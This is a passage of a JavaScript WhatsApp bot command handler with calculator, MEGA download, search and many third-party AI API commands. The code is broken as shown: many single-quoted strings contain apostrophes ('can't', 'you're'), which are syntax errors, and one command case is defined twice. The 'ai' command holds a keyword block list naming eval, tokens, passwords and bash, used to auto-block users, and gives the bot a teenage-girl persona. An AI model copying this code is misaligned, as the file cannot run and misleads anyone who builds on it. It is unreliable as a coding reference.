if (!text.includes('+')) return newReply(`Use with format ${prefix + command} *number* + *number*\n\n_Example_\n\n${prefix + command} 1+2`)
try {
	arg = args.join(' ')
	top = arg.split('+')[0]
	bottom = arg.split('+')[1]
	let value_one = Number(top)
	let value_two = Number(bottom)
	newReply(`${value_one + value_two}`)
} catch (error) {
	console.log(error);
	newReply('Failed to perform action, if you're the owner please check console.');
};
}
break

case 'subtract': {
if (!text.includes('-')) return newReply(`Use with format ${prefix + command} *number* - *number*\n\n_Example_\n\n${prefix + command} 1-2`)
try {
	arg = args.join(' ')
	top = arg.split('-')[0]
	bottom = arg.split('-')[1]
	let value_one = Number(top)
	let value_two = Number(bottom)
	newReply(`${value_one - value_two}`)
} catch (error) {
	console.log(error);
	newReply('Failed to perform action, if you're the owner please check console.');
};
}
break

case 'multiply': {
if (!text.includes('*')) return newReply(`Use with format ${prefix + command} *number* * *number*\n\n_Example_\n\n${prefix + command} 1*2`)
try {
	arg = args.join(' ')
	top = arg.split('*')[0]
	bottom = arg.split('*')[1]
	let value_one = Number(top)
	let value_two = Number(bottom)
	newReply(`${value_one * value_two}`)
} catch (error) {
	console.log(error);
	newReply('Failed to perform action, if you're the owner please check console.');
};
}
break

case 'divide': {
if (!text.includes('/')) return newReply(`Use with format ${prefix + command} *number* / *number*\n\n_Example_\n\n${prefix + command} 1/2`)
try {
	arg = args.join(' ')
	top = arg.split('/')[0]
	bottom = arg.split('/')[1]
	let value_one = Number(top)
	let value_two = Number(bottom)
	newReply(`${value_one / value_two}`)
} catch (error) {
	console.log(error);
	newReply('Failed to perform action, if you're the owner please check console.');
};
}
break

case 'getjoinrequest':{
if (!m.isGroup) return newReply(mess.group);
if (!isBotAdmins) return newReply(mess.botAdmin);
if (!isAdmins && !isCreator) return newReply(mess.admin);
const data = await sock.groupRequestParticipantsList(m.chat);
if (!data || !data.length) {
	sock.sendMessage(m.chat, {text: '✨ No pending join requests. ✅'}, {quoted:m});
	return;
}
let replyMessage = `📋 *Join Request List*: \n\n`;
data.forEach((request, index) => {
	const { jid, request_method, request_time } = request;
	const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
	replyMessage += `*No. ${index + 1} - Join Request Details:*\n`;
	replyMessage += `🧑‍🤝‍🧑 *User ID*: ${jid}\n`;
	replyMessage += `🔧 *Method*: ${request_method}\n`;
	replyMessage += `🕰️ *Request Time*: ${formattedTime}\n\n`;
});
sock.sendMessage(m.chat, {
	text: replyMessage
}, { 
	quoted: m 
});
};
break;

case 'mega':{
try {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	if (!text) return newReply(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
	const { File } = require('megajs');
	const file = File.fromURL(text);
	await file.loadAttributes();
	if (file.size >= 300000000) return newReply('😔 *File too large* (Maximum size: 300MB). Please try another file!');
	const downloadingMessage = `🌩️ *Downloading file...* Please wait a moment!`;
	newReply(downloadingMessage);
	const caption = `✨ *Successfully downloaded!* ✨\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
	const data = await file.downloadBuffer();
	const fileExtension = path.extname(file.name).toLowerCase();
	const mimeTypes = {
		".mp4": "video/mp4",
		".pdf": "application/pdf",
		".zip": "application/zip",
		".rar": "application/x-rar-compressed",
		".7z": "application/x-7z-compressed",
		".jpg": "image/jpeg",
		".jpeg": "image/jpeg",
		".png": "image/jpeg",
	};
	let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
	await sock.sendMessage(m.chat, {
		document: data, 
		mimetype: mimetype, 
		fileName: file.name, 
		caption: caption
	}, { quoted: m });
} catch (error) {
	return newReply(`⚠️ *Oops, an error occurred*: ${error.message}`);
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'ai':
case 'Mora': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!text) return newReply(`Hello, how can I help you?`);	

// List of forbidden words/phrases
const forbiddenKeywords = [
	"retype", "copy", "salin", "ulang", "execute", "run", "eval",
	"token", "apikey", "password", "cmd", "command", "script",
	"bash", "terminal", "console", "shutdown", "restart", "$", ">", "=>"
];

// Function to detect suspicious word repetition
const isRepeatingText = (input) => {
	const words = input.toLowerCase().split(/\s+/);
	const uniqueWords = new Set(words);
	return uniqueWords.size / words.length < 0.5; // If >50% words repeated, considered suspicious
};

// Detect if input contains forbidden words or repeating patterns
const containsForbidden = forbiddenKeywords.some(keyword => 
	text.toLowerCase().includes(keyword)
);

if ((containsForbidden || isRepeatingText(text)) && !isCreator) {
	// Automatically block sender's number if not owner
	try {
		await m.react('⚠️');
		await sleep(1000);
		await newReply(`You have violated the rules and have been automatically blocked.`);
		await sleep(1000);
		await sock.updateBlockStatus(m.sender, 'block');
		await sleep(1000);
		console.log(`Number ${m.sender} has been blocked for attempting to send forbidden commands.`);
	} catch (error) {
		console.error(`Failed to block number ${m.sender}:`, error);
	}
	break;
}

try {
	// Refined AI prompt using +=
	let message = "Change your speaking style to be more characteristic and open, your name is Mora AI, usually called Mora.";
	message += " You are a cute 16-year-old girl who really loves to learn and study new things about the world and about Khalid.";
	message += " Express yourself with emojis, speak informally, and use words like \"I\" and \"you\" when speaking like a human.";
	message += " Do not repeat words or sentences exactly from user input. Answer creatively, as if they are your own thoughts.";

	let result = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${encodeURIComponent(message)}&content=${encodeURIComponent(text)}`);

	await sock.sendMessage(m.chat, {
		text: result.data,
		ai: !m.isGroup
	}, { quoted: m });

} catch (err) {
	console.log(err);
	newReply(mess.error);
}

db.data.users[m.sender].limit -= 1;
break;
}

case 'llama33': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter the text you want to ask or convey, sis/bro!');
const prompt = encodeURIComponent('Be a helpful assistant');
const query = encodeURIComponent(text);
const apiUrl = `https://api.siputzx.my.id/api/ai/llama33?prompt=${prompt}&text=${query}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later, sis/bro!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was an error trying to access the API. Make sure your internet connection is stable, sis/bro.');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'metaai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return m.reply('Please enter the text you want to ask or convey, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/meta-llama-33-70B-instruct-turbo?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		m.reply(data.data);
	} else {
		m.reply('Sorry, I can't give an answer now. Try again later, sis/bro!');
	}
} catch (error) {
	console.error(error);
	m.reply('Oops! There was a problem trying to access the API. Make sure your internet connection is smooth, sis/bro!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'nousai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter the text you want to ask, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/nous-hermes?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later, sis/bro!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Make sure your internet connection is smooth, sis/bro!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'jokoai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter the text you want to ask, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/joko?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later, sis/bro!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Make sure your internet connection is smooth, sis/bro!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'aoyoai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter the text you want to ask, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/aoyo?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later, sis/bro!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Make sure your internet connection is smooth, sis/bro!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'bardai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter the question you want to ask, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/bard?query=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later, sis/bro!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Make sure your internet connection is smooth, sis/bro!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'bibleai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter the question you want to ask, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/bible?question=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later, sis/bro!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Make sure your internet connection is smooth, sis/bro!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'blackboxaipro': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/blackboxai-pro?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'blackboxai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/blackboxai?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'claudesonnet': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/claude-sonnet-35?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'dbrxinstruct': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/dbrx-instruct?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'deepseekchat': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/deepseek-llm-67b-chat?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data);
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'deepseek': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/deepseek?prompt=You%20are%20an%20assistant%20that%20always%20responds%20in%20Indonesian%20with%20a%20friendly%20and%20informal%20tone&message=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'dreamshaper': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a prompt for the image, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/dreamshaper?prompt=${encodeURIComponent(text)}`;
try {
	// Using fetch to get image as binary
	const data = await fetch(apiUrl);
	if (!data.ok) throw new Error('Failed to fetch image.');

	const imageBuffer = await data.buffer(); // Get image as buffer
	const caption = 'Here is the image you requested!';

	// Send image to user with caption
	m.reply({ image: imageBuffer, caption: caption });

} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to create the image. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'esia': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/esia?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'flux': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a prompt for the image, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/flux?prompt=${encodeURIComponent(text)}`;
try {
	const data = await fetch(apiUrl);
	if (data.ok) {
		const imageBuffer = await data.buffer();
		m.reply({ image: imageBuffer, caption: 'Here is the image, hope it meets your expectations!' });
	} else {
		newReply('Sorry, I can't access that image now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'felo': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/felo?query=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'gandalf': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/gandalf?prompt=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'gemini-pro': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/gemini-pro?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'gemma': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/gemma?prompt=You%20are%20an%20assistant%20that%20always%20responds%20in%20Indonesian%20with%20a%20friendly%20and%20informal%20tone&message=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'gpt3': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/gpt3?prompt=You%20are%20a%20cheerful%20ai&content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'gita': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/gita?q=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'metaai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'mistral-7b-instruct-v0.2': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/mistral-7b-instruct-v0.2?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'muslimai': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'naw': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!isPremium) return newReply(mess.premium);
if (!text) return newReply('Please enter a question or command, sis/bro!');
const apiUrl = `https://api.siputzx.my.id/api/ai/naw?content=${encodeURIComponent(text)}`;
try {
	const data = await fetchJson(apiUrl);
	if (data.status) {
		newReply(data.data); // Deliver API response
	} else {
		newReply('Sorry, I can't give an answer now. Try again later!');
	}
} catch (error) {
	console.error(error);
	newReply('Oops! There was a problem trying to access the API. Try again later!');
}
db.data.users[m.sender].limit -= 1;	// Reduce limit
break;
}

case 'simi': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!text) return newReply(`⚠️ Use with format: ${prefix + command} *conversation text*\n\n🤔 *Example:*\n\n${prefix + command} Hello, how are you?`);
try {
	const language = 'id';
	const data = await chatSimi(text, language);
	if (!data) return newReply(`⚠️ Mora didn't get an answer from SimSimi, Sis/Bro! 🥲`);
	newReply(`${data}`);
} catch (err) {
	console.error(err);
	newReply(`❌ There was a problem chatting with SimSimi, Sis/Bro! Try again later 🥺`);
}
db.data.users[m.sender].limit -= 1;
break;
};
case 'wallpaper': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!text) return newReply(`⚠️ Use with format: ${prefix + command} *keyword* [page]\n\n🤔 *Example:*\n\n${prefix + command} nature 2`);
const [query, page] = text.split(' ');
try {
	const wallpapers = await wallpaper(query, page || '1');
	if (wallpapers.length === 0) return newReply(`⚠️ Mora couldn't find wallpapers with keyword "${query}", Sis/Bro! 🥲`);
	let result = wallpapers.map(wp => `🖼️ *${wp.title}*\n🔗 ${wp.source}\n🌟 *Type*: ${wp.type}`).join('\n\n');
	newReply(`🎨 *Wallpaper Results for*: ${query}\n\n${result}`);
} catch (err) {
	console.error(err);
	newReply(`❌ There was a problem fetching wallpapers, Sis/Bro! Try again later 🥺`);
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'wikimedia': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!text) return newReply(`⚠️ Use with format: ${prefix + command} *keyword*\n\n🤔 *Example:*\n\n${prefix + command} sunset`);
try {
	const results = await wikimedia(text);
	if (results.length === 0) return newReply(`⚠️ Mora couldn't find images on Wikimedia with keyword "${text}", Sis/Bro! 🥲`);
	let result = results.map(img => `🖼️ *${img.title || 'No Title'}*\n🔗 ${img.source}`).join('\n\n');
	newReply(`🌐 *Wikimedia Search Results for*: ${text}\n\n${result}`);
} catch (err) {
	console.error(err);
	newReply(`❌ There was a problem fetching images from Wikimedia, Sis/Bro! Try again later 🥺`);
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'wikipedia':
case 'wiki': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!text) return newReply(`Hmm... What are you looking for on Wikipedia? Try typing the name or topic you want to search~ 😊`);
try {
	const link = await axios.get(`https://id.wikipedia.org/wiki/${text}`);
	const $ = cheerio.load(link.data);
	let header = $('#firstHeading').text().trim();
	let output = $('#mw-content-text > div.mw-parser-output').find('p').text().trim();
	if (!header || !output) {
		return newReply('Oops, it seems there are no results for this search 😔 Try another keyword!');
	}
	newReply(`📛 *Title*: ${header}\n\n✨ *Brief Description*: ${output}\n\nHope that helps! If you're still curious, try searching other topics~ 😄`);
} catch (err) {
	newReply('Oops, there was an error! Couldn't find what you're looking for 😓. Try again later!');
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'happymod': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!text) return newReply(`⚠️ Use with format: ${prefix + command} *app name*\n\n🤔 *Example:*\n\n${prefix + command} Minecraft`);
try {
	const results = await happymod(text);
	if (results.length === 0) return newReply(`⚠️ Mora couldn't find apps on HappyMod with keyword "${text}", Sis/Bro! 🥲`);
	let result = results.map(app => `📱 *${app.title}*\n⭐ *Rating*: ${app.rating}\n🔗 ${app.link}`).join('\n\n');
	newReply(`📦 *HappyMod Search Results for*: ${text}\n\n${result}`);
} catch (err) {
	console.error(err);
	newReply(`❌ There was a problem fetching data from HappyMod, Sis/Bro! Try again later 🥺`);
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'ringtone': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
if (!text) return newReply(`⚠️ Use with format: ${prefix + command} *ringtone title*\n\n🤔 *Example:*\n\n${prefix + command} iPhone`);
try {
	const results = await ringtone(text);
	if (results.length === 0) return newReply(`⚠️ Mora couldn't find ringtones with keyword "${text}", Sis/Bro! 🥲`);
	let result = results.map(rt => `🎵 *${rt.title}*\n🔗 ${rt.audio}`).join('\n\n');
	newReply(`🔊 *Ringtone Search Results for*: ${text}\n\n${result}`);
} catch (err) {
	console.error(err);
	newReply(`❌ There was a problem fetching ringtones, Sis/Bro! Try again later 🥺`);
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'traceanime': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
try {
	let q = m.quoted ? m.quoted : m;
	let mime = (q.msg || q).mimetype || q.mediaType || "";
	if (!mime.startsWith('image')) {
		return newReply("*Please send an image first* 📸");
	}
	let media = await sock.downloadAndSaveMediaMessage(q);
	let images = await fileIO(media);
	let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(images)}`;
	console.log("API URL:", apiUrl);
	let data = await fetch(apiUrl);
	let result = await data.json();
	console.log("API Data:", result);
	if (!result || result.error || result.result.length === 0) {
		return newReply("*Error: Cannot trace anime from this image.* 😞");
	}
	let { anilist, from, to, similarity, video, image, episode } = result.result[0];
	let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
	let message = `✨ *Detected Anime*: ${animeTitle}\n`;
	if (anilist.synonyms && anilist.synonyms.length > 0) {
		message += `✨ *Synonyms*: ${anilist.synonyms.join(", ")}\n`;
	}
	message += `✨ *Similarity*: ${similarity.toFixed(2)}%\n`;
	message += `✨ *Duration*: ${formatDuration(from * 1000)} · ${formatDuration(to * 1000)}\n`;
	if (episode) {
		message += `✨ *Episode*: ${episode}\n`;
	}
	console.log("Anime Info:", {
		animeTitle,
		synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
		similarity,
		timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
		video,
		episode,
	});
	await sock.sendMessage(m.chat, { video: { url: video }, caption: message }, { quoted: m });
} catch (error) {
	console.error("Error:", error);
	newReply("*Error: Cannot trace anime or send video.* 😞");
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'mangainfo': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const mangaName = args.join(' ');
if (!mangaName) return newReply('⚠️ Please enter the manga name you want to search.');
try {
	const mangaList = await komiku("manga", mangaName);
	if (mangaList.length === 0) {
		return newReply('⚠️ Manga not found. Try searching with a different name.');
	}
	let captionText = `📚 *Manga Search Results - ${mangaName}* 📚\n\n`;
	mangaList.slice(0, 5).forEach((manga, index) => {
		captionText += `📖 *${index + 1}. ${manga.title}*\n`;
		captionText += `🗂️ *Genre*: ${manga.genre}\n`;
		captionText += `🔗 *URL*: ${manga.url}\n`;
		captionText += `📖 *Description*: ${manga.description}\n\n`;
	});
	await newReply(captionText);
} catch (error) {
	console.error(error);
	newReply('⚠️ An error occurred while searching for manga.');
}
db.data.users[m.sender].limit -= 1;
break;
}

case 'mangadetail': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const url = args[0];
if (!url) return newReply('⚠️ Please enter the manga URL you want to see details for.');
try {
	const mangaDetail = await detail(url);
	let captionText = `📚 *Manga Details* 📚\n\n`;
	captionText += `📖 *Title*: ${mangaDetail.title}\n`;
	captionText += `🗂️ *Genre*: ${mangaDetail.genres.join(', ')}\n`;
	captionText += `📖 *Description*: ${mangaDetail.description}\n`;
	captionText += `📅 *First Chapter*: ${mangaDetail.awalChapter}\n`;
	captionText += `📅 *Latest Chapter*: ${mangaDetail.newChapter}\n`;
	sock.sendMessage(m.chat, {
		image: { url: mangaDetail.coverImage },
		caption: captionText
	}, {
		quoted: m
	})
